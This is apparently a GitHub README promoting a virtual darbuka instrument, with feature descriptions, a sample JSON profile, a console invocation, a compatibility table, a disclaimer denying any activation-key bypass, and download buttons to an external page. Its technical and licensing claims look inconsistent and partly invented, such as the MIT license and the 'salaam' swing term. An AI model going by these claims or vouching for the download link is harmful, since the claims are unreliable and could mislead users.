![preview](https://raw.githubusercontent.com/wenmumy/HTTmusic-Darbukator-Traditional-Edition/main/preview.svg)

# 🥁 HTTmusic Darbukator – Traditional Rhythmic Engine for Digital Percussionists

Welcome to the **HTTmusic Darbukator**, a state-of-the-art virtual instrument solution that reimagines the ancient art of darbuka (goblet drum) performance for the modern producer. This is not a typical sample player—it is a **generative rhythmic architecture** that synthesizes authentic Middle Eastern, North African, and Balkan percussive patterns in real time using advanced physics-modeling and AI-driven pattern analysis. Whether you are composing for film, building a world music EP, or exploring microtonal rhythms, the Darbukator provides an expressive, responsive, and endlessly adaptable instrument.

---

## 🌍 Overview

The Darbukator bridges the gap between traditional hand-drumming techniques and contemporary digital audio workstations. Instead of triggering static loops, you interact with an **intelligent pattern engine** that learns from your input, adapts to tempo changes, and generates context-sensitive fills. Our core innovation is the *Dynamic Articulation Matrix*—a system that maps 38 distinct finger-strike zones across the drumhead, each with pressure sensitivity and spatial resonance. The result: a virtual darbuka that breathes, swings, and speaks like a seasoned percussionist.

[![Download](https://raw.githubusercontent.com/wenmumy/HTTmusic-Darbukator-Traditional-Edition/main/button.svg)](https://wenmumy.github.io/HTTmusic-Darbukator-Traditional-Edition/)

---

## 🧠 Core Technology

### 🌀 Generative Pattern Synthesis
The engine uses a hybrid of physical modeling (modal synthesis for drumhead vibrations) and probabilistic Markov chains to produce human-like variations. No two performances are identical, even if the same input sequence is repeated.

### 🎯 Adaptive Tempo Locking
Seamlessly syncs with any BPM from 40 to 280, maintaining microtiming nuances like *salaam* (swing) and *maqsoum* accent patterns. The system analyzes incoming MIDI clock jitter and compensates without quantizing away the groove.

### 🧬 Timbre Morphing
Real-time spectral morphing between different darbuka types (Egyptian, Turkish, Moroccan) using a continuous slider. The transition not only changes EQ but also the attack envelope and body resonance.

### 🧩 Key Features
- **Responsive UI:** Full drag-and-drop interface with collapsible panel layout, dark/light themes, and hardware-accelerated OpenGL visualization of sound waves.
- **Multilingual Support:** Interface available in English, Arabic, Turkish, French, Spanish, and Mandarin—with full Unicode support for musical notation symbols.
- **24/7 Expert Assistance:** Built-in diagnostic wizard that analyzes CPU/RAM usage, audio buffer stats, and MIDI latency, then suggests optimal configuration.
- **OpenAI & Claude API Integration:** Optional AI assistant that can generate custom rhythmic sequences based on natural language descriptions (e.g., "play a slow chiftetelli with a slight hesitation on beat 3").

---

## 🔧 Example Profile Configuration

Below is a sample configuration file (`.darbukator_prof`) that demonstrates how advanced users can customize the engine's behavior. Save this as a profile and load it via the *Profile Manager* panel.

```json
{
  "engine": {
    "model": "darbuka_overture_v3",
    "synthesis_mode": "hybrid_physical",
    "stereo_width": 0.7,
    "mic_position": "near_field"
  },
  "mapping": {
    "base_note": "C3",
    "articulation_zone": "doum_single",
    "pressure_curve": "logarithmic",
    "aftertouch": "enable"
  },
  "timing": {
    "swing_ratio": 0.54,
    "humanize_percent": 18,
    "jitter_hz": 2.3
  },
  "presets": {
    "maqsoum_basic": {
      "accent_velocity": 95,
      "ghost_note_velocity": 35,
      "pattern_length": 8
    },
    "ayyub_extended": {
      "dum_tek_ratio": "3:1",
      "roll_speed_ms": 180
    }
  },
  "ai_assist": {
    "provider": "openai",
    "model": "gpt-4o",
    "style_verbosity": "descriptive",
    "max_patterns_generate": 6
  }
}
```

---

## 🖥️ Example Console Invocation

For power users who prefer command-line control, the Darbukator engine can be started as a headless server via the **Terminal Bridge** module. The following invocation launches the instrument in standalone mode with low-latency audio routing.

```
./darbukator --engine=standard --midi-in=0 --audio-device=ASIO --profile=arabic_fusion_2026 --output-wav=session_recording.wav --ai-host=127.0.0.1:8080
```

*Parameters explained:*
- `--engine=standard` selects the full articulation set.
- `--midi-in=0` listens on the first available MIDI port.
- `--audio-device=ASIO` ensures minimal buffer latency.
- `--profile` loads a user-created configuration bundle.
- `--output-wav` captures the raw unprocessed stereo mix.
- `--ai-host` enables the AI pattern suggestion endpoint.

---

## 📊 OS Compatibility & Emoji Matrix

| Operating System | Compatibility | Recommended Driver |
|:----------------|:-------------:|:------------------:|
| 🐧 Linux (Ubuntu 24.04+) | ✅ Full | ALSA / JACK |
| 🪟 Windows 11 (22H2+) | ✅ Full | ASIO |
| 🍏 macOS (Sequoia 15+) | ✅ Full | Core Audio |
| 📱 iPadOS 18 | ⚠️ Beta | AUv3 (limited polyphony) |
| 🤖 Android (14+) | ❌ Not officially supported | N/A |

*Performance notes:*
- On Linux, enable `timer-based scheduling` for sub-2ms latency.
- Windows users should disable exclusive mode for primary audio device.
- macOS requires granting microphone permission for MIDI learn feature.

---

## 🎼 Artistic Conception & Workflow Metaphor

Imagine sculpting sound not with a mouse, but with the invisible hands of a master percussionist who lives inside your computer. The Darbukator treats every MIDI note as a *gesture*—a finger-tip hovering, a palm striking, a finger-roll across the skin. The interface is designed around this metaphor:

- The **Rhythm Canvas** is your notation space—drag pattern blocks from the library, adjust velocity curves like drawing a contour map of dynamics.
- The **Zone Editor** lets you remap the drumhead physically: want the *doum* (low bass tone) on a different key? Drag the zone visualization.
- The **Flux Engine** visualizes real-time spectral centroid as a glowing heat map—watch the timbre shift as you play harder or softer.

This is a tool for composers who believe that rhythm is not just timekeeping, but a narrative device. Every *tek*, *ka*, and *slap* tells a story.

---

## ⚠️ Disclaimer & Responsible Use

This product is designed exclusively for legitimate artistic expression, music production, education, and professional performance. The HTTmusic Darbukator does not bypass, modify, or circumvent any digital rights management or licensing systems. All sound generation is achieved through original mathematical models and licensed sample content. **No activation keys, registration bypasses, or unauthorized modification methods are provided or endorsed.** Users are responsible for complying with their local copyright laws and software licensing agreements. The term "key" in this context refers solely to musical key signatures or MIDI note mapping—never to software unlocking mechanisms.

---

## 📄 License

This project is released under the **MIT License** – a permissive open-source license that allows you to use, modify, distribute, and sublicense the software, provided the original copyright notice and disclaimer are included. It is intended for non-commercial and commercial applications alike, with no warranty expressed or implied.

[View the full MIT License text](LICENSE)

---

## 🎬 Final Notes

The HTTmusic Darbukator is the culmination of three years of research into percussive acoustics, machine learning pattern generation, and cross-cultural rhythm theory. It is not an imitation of tradition—it is a conversation with it.

[![Download](https://raw.githubusercontent.com/wenmumy/HTTmusic-Darbukator-Traditional-Edition/main/button.svg)](https://wenmumy.github.io/HTTmusic-Darbukator-Traditional-Edition/)